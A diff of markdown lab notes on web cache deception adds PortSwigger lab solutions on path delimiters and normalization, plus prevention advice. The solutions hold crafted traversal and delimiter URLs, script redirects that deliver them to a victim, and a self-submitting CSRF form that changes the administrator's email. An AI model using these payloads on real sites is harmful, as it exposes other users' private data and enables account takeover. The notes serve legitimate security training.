@@ -63,20 +63,20 @@ Caches may also use custom rules based on parameters or other logic.
 ----
 # Exploiting path delimiters for web cache deception
 Delimiter discrepancies occur when the cache and the origin server interpret certain characters differently as URL separators, leading to web cache deception.
-### Example 1 -->  `/profile;foo.css`  
-- The origin server (Java Spring) treats `;` as a delimiter and interprets the path as `/profile`, returning profile data.  
-- The cache treats the full path `/profile;foo.css` and may cache it as a `.css` file.
+- ### Example 1 -->  `/profile;foo.css`  
+	- The origin server (Java Spring) treats `;` as a delimiter and interprets the path as `/profile`, returning profile data.  
+	- The cache treats the full path `/profile;foo.css` and may cache it as a `.css` file.
 <br/>
 
-### Example 2 (Ruby on Rails using `.` as a delimiter):  
-- `/profile` → returns profile (HTML)  
-- `/profile.css` → error (no CSS formatter)  
-- `/profile.ico` → treated as HTML and returns profile data, but the cache may store it due to the `.ico` extension.
+- ### Example 2 (Ruby on Rails using `.` as a delimiter):  
+	- `/profile` → returns profile (HTML)  
+	- `/profile.css` → error (no CSS formatter)  
+	- `/profile.ico` → treated as HTML and returns profile data, but the cache may store it due to the `.ico` extension.
 <br/>
 
-### Example 3 (encoded delimiter) -->  `/profile%00foo.js`  
-- The origin server (OpenLiteSpeed) treats `%00` as a delimiter and interprets the path as `/profile`.  
-- The cache (e.g., Akamai/Fastly) may treat the full path and cache it as a `.js` file.
+- ### Example 3 (encoded delimiter) -->  `/profile%00foo.js`  
+	- The origin server (OpenLiteSpeed) treats `%00` as a delimiter and interprets the path as `/profile`.  
+	- The cache (e.g., Akamai/Fastly) may treat the full path and cache it as a `.js` file.
 <br/>
 - Make sure to test all ASCII characters and a range of common extensions, including `.css`, `.ico`, and `.exe`.
 - This is the list of [possible delimiters](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)  
@@ -84,17 +84,14 @@ Delimiter discrepancies occur when the cache and the origin server interpret cer
 
 ## Delimiter decoding discrepancies
 Delimiter decoding discrepancies occur when the cache and the origin server decode URL-encoded delimiter characters differently, causing them to interpret the URL path in different ways and enabling web cache deception.
-### Example 1:  
-`/profile%23wcd.css`
-- The origin server decodes `%23` to `#`, treats `#` as a delimiter, and interprets the path as `/profile`, returning profile data.  
-- The cache does not decode `%23`, interprets the full path `/profile%23wcd.css`, and may cache the response due to the `.css` extension.
+- ### Example 1:  `/profile%23wcd.css`
+	- The origin server decodes `%23` to `#`, treats `#` as a delimiter, and interprets the path as `/profile`, returning profile data.  
+	- The cache does not decode `%23`, interprets the full path `/profile%23wcd.css`, and may cache the response due to the `.css` extension.
 <br/>
-### Example 2:  
-`/myaccount%3fwcd.css`
-- The cache applies rules on the encoded path `/myaccount%3fwcd.css`, matches the `.css` extension, and caches it. Then it decodes `%3f` to `?` and forwards `/myaccount?wcd.css` to the origin.  
-- The origin treats `?` as a delimiter and interprets the path as `/myaccount`, returning sensitive dynamic data that is now cached.
+- ### Example 2:  `/myaccount%3fwcd.css`
+	- The cache applies rules on the encoded path `/myaccount%3fwcd.css`, matches the `.css` extension, and caches it. Then it decodes `%3f` to `?` and forwards `/myaccount?wcd.css` to the origin.  
+	- The origin treats `?` as a delimiter and interprets the path as `/myaccount`, returning sensitive dynamic data that is now cached.
 <br/>
-
 - **Also test encoded non-printable delimiters such as `%00`, `%0A`, and `%09`, which may truncate the path after decoding.**
 <br/>
 - **Lab Description**: To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`.
@@ -103,5 +100,128 @@ Delimiter decoding discrepancies occur when the cache and the origin server deco
 - First, I tried `/my-account/foo` and `/my-accountfoo`, but both returned `404 Not Found`
 - I used burp intruder to run a snipper attack `/my-account$$foo`, Only `;` and `?` returns `200 OK`
 - Complete the same steps as above, but the crafted URL is `https://0af9001604ccb1ad817ca7890066000f.web-security-academy.net/my-account;foo.css`
+
+----
+# Exploiting origin server normalization for web cache deception
+Static directory cache rules target URL prefixes like `/static`, `/assets`, `/scripts`, or `/images` to cache static files, but they can be abused using path traversal and normalization differences between the cache and the origin server.
+
+Normalization means converting the URL path to a standard form by decoding characters and resolving dot-segments (..). If the cache and origin server normalize differently, the same URL can be interpreted in two ways.  
+- ### Example: `/static/..%2fprofile`
+	- The origin server decodes %2f to / and resolves .., so it sees the path as /profile and returns profile data.
+	- The cache does not decode or resolve it, so it sees /static/..%2fprofile. Because it starts with /static, it applies the static directory rule and caches the response.
+Each dot-segment must be encoded (like ..%2f) so the browser does not normalize it before sending.
+
+- To detect normalization by the origin server, send a request to a non-cacheable endpoint (like POST) with a fake directory and encoded traversal, for example: /aaa/..%2fprofile
+	- If it returns the same response as /profile, the origin decoded and normalized it.
+	- If it returns 404, it did not.
+
+- To detect normalization by the cache, take a cached static file and add traversal, for example: /aaa/..%2fassets/js/stockCheck.js
+	- If it is no longer cached, the cache is matching strictly on /assets and not normalizing.
+	- If it is still cached, it may be normalizing to /assets/js/stockCheck.js.
+	- Another test: change /assets/js/stockCheck.js to /assets/..%2fjs/stockCheck.js
+		- If not cached, the cache decoded and resolved it to /js/stockCheck.js.
+		- If still cached, it treated it as /assets/..%2fjs/stockCheck.js.
+
+- To confirm the rule is really directory-based, try `/assets/aaa`. If it is cached, the rule is based on the /assets prefix.
+### Abstract
+- Exploitation works <span style="color:rgb(0, 112, 192)">when the origin normalizes but the cache does not</span>, using `/<static-directory>/..%2f<dynamic-path>` --> `/assets/..%2fprofile`
+	- Cache sees: /assets/..%2fprofile (matches static rule, caches it)
+	- Origin sees: /profile (returns dynamic profile data)
+As a result, sensitive dynamic content is stored and served from the cache.
+
+<br/>
+- **Lab Description**: To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`. We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).
+<br/>
+## 💡 <span style="color:rgb(0, 176, 80)">Solution</span>
+- The `/my-account` endpoint is dynamic and doesn't contain any caching headers in the response.
+- In the Burp's history, we can see that the `resources` directory serves the static files
+	![](../assets/img/Pasted%20image%2020260120233450.png)
+- Changing `/my-account` to `/resources/..%2fmy-account`, we get a caching oracle in the response headers
+	![](../assets/img/Pasted%20image%2020260120233732.png)
+- So, this confirms that the caching server caches content based-on the `/resource` prefix
+- Now, add this to the body of your exploit server and hit `Deliver exploit to victm`
+```html
+<script>window.location="https://0a3800c4046147b4d8f072ca000e00ac.web-security-academy.net/resources/..%2fmy-account?cb=cache-buster"</script>
+```
+
+----
+# Exploiting cache server normalization for web cache deception
+If the cache server normalizes the path (decodes encoded dot-segments like `%2e%2e` and resolves them) but the origin server does not, you can abuse this difference using a payload of the form: `/<dynamic-path>%2f%2e%2e%2f<static-directory>`
+
+All characters in the traversal sequence must be URL-encoded, for example `%2f%2e%2e%2f` instead of `/../`, so the cache performs the decoding and normalization itself.
+
+- ### Example without using a delimiter -->  `/profile%2f%2e%2e%2fstatic`
+	- The cache decodes and resolves it, so it becomes `/static` and applies the static directory cache rule.
+	- The origin server does not normalize it, so it sees the full path `/profile%2f%2e%2e%2fstatic` and likely returns an error, not the profile data.  
+- <span style="color:rgb(255, 0, 0)">So path traversal alone is not enough.</span>
+- To make the origin return the dynamic content, you must also <span style="color:rgb(255, 0, 0)">use a delimiter</span> that the origin server understands but the cache does not. Add this delimiter after the dynamic path.
+
+- ### Example with a delimiter -->  `/profile;%2f%2e%2e%2fstatic`
+	- The cache ignores the `;` as a delimiter, decodes the traversal, and normalizes the path to `/static`, so it caches the response.
+    - The origin server treats `;` as a delimiter, truncates the path to `/profile`, and returns the profile information.
+
+- As a result, the dynamic /profile response is stored in the cache as if it were a static /static resource, enabling a web cache deception attack.
+<br/>
+- **Lab Description**: To solve the lab, find the API key for the user `carlos`. You can log in to your own account using the following credentials: `wiener:peter`. We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).
+<br/>
+## 💡 <span style="color:rgb(0, 176, 80)">Solution</span>
+- Changing `/my-account` to `/my-account;%2f%2e%2e%2fstatic`, we get `404 Not Found`, which indicates that `;` is not identified as a delimiter by the origin server.
+- Send the request to intruder to fuzz for supported delimiters by the origin server --> `/my-account$;$%2f%2e%2e%2fresources` and unselect `URL-encode these characters` then hit `start attack`
+- We got multiple `200 OK` instances:
+	![](../assets/img/Pasted%20image%2020260121010610.png)
+- The payloads:
+	- `?` , `%3F`: get `200 OK`, but without any caching headers in the response, which means that they are considered as delimiters by the origin server, but not ignored by the caching server.
+	- `%23...%3D`: are all ignored by the caching server, but the origin server sees only `%23` as a delimiter. Then why all other requests starting from `36:51` returns `200 Ok` as well? As they all git a `X-Cache: hit`, which means that they are served by the caching server after the payload `%23` has initially tricked the cache server to cache the response.
+- So, let's craft our payload
+```html
+<script>window.location="https://0a690020042620b3c39bb6f30006000b.web-security-academy.net/my-account%23%2f%2e%2e%2fresources"</script>
+```
+
+----
+# Exploiting file name cache rules
+File name cache rules target specific common files like `robots.txt`, `index.html`, and `favicon.ico`, and cache them based on the exact file name because they rarely change. To check if such a rule exists, send a GET request for one of these files and see whether the response is cached.
+
+- To detect normalization differences between the cache and the origin server, test how the cache handles path traversal before the file name. For example, send a request like `/profile%2f%2e%2e%2findex.html`:
+	- If the response is cached, this means the cache decodes the encoded slash and dot-segment, normalizes the path to `/index.html`, and applies the file name cache rule.
+	- If the response is not cached, this means the cache does not normalize the path and treats it as `/profile%2f%2e%2e%2findex.html`, so the file name rule is not triggered.
+
+- Exploiting this type of issue is only possible when the cache resolves encoded dot-segments but the origin server does not. In this case, you can use the same technique as with static directory cache rules, but instead of a directory prefix, you use the file name itself. For example, if the cache normalizes `/profile%2f%2e%2e%2findex.html` to `/index.html` while the origin server keeps it as `/profile;%2f%2e%2e%2findex.html`, the cache may store and serve dynamic content as if it were the static file `index.html`.
+<br/>
+- **Lab Description**: To solve the lab, change the email address for the user `administrator`. You can log in to your own account using the following credentials: `wiener:peter`.We have provided a list of possible delimiter characters to help you solve the lab: [Web cache deception lab delimiter list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list).
+<br/>
+## 💡 <span style="color:rgb(0, 176, 80)">Solution</span>
+- After proxying the traffic to burp, no sign on any endpoint that it's being cached. So, in such cases we have to search for a cached file such as `robots.txt` or `favicon.ico`. 
+- I tried to request `favicon.ico` and it contains a cache oracle in the response headers.
+- So, let's use it to cache the `my-account` endpoint by using `/my-account;%2f%2e%2e%2ffavicon.ico` and it returns `200 Ok` with a caching oracle
+	![](../assets/img/Pasted%20image%2020260121024207.png)
+- Now, let's craft our payload, store in the exploit server and deliver to the victim multiple times to make sure it works and if doesn't you can append a `cb=cache` after the `?`
+```html
+<script>window.location="https://0ab300990434d6bc81616133005e0061.web-security-academy.net/my-account;%2f%2e%2e%2ffavicon.ico?"</script>
+```
+- Send the request from burp and you should see 
+	![](../assets/img/Pasted%20image%2020260121024525.png)
+- Now, extract the `CSRF token` from the response to use it with the `POST /my-account/change-email` request, then craft a CSRF POC as follows and deliver it to the victim.
+```html
+<html>
+  <body>
+    <form action="https://0ab300990434d6bc81616133005e0061.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="attacker@test.com">
+      <input type="hidden" name="csrf" value="nd9Az13NtCJdFvZkP1lke9DCy7dQU475">
+    </form>
+
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+----
+# Preventing web cache deception vulnerabilities
+You can take a range of steps to prevent web cache deception vulnerabilities:
+- Always use `Cache-Control` headers to mark dynamic resources, set with the directives `no-store` and `private`.
+- Configure your CDN settings so that your caching rules don't override the `Cache-Control` header.
+- Activate any protection that your CDN has against web cache deception attacks. Many CDNs enable you to set a cache rule that verifies that the response `Content-Type` matches the request's URL file extension. For example, Cloudflare's Cache Deception Armor.
+- Verify that there aren't any discrepancies between how the origin server and the cache interpret URL paths.
 
 ----
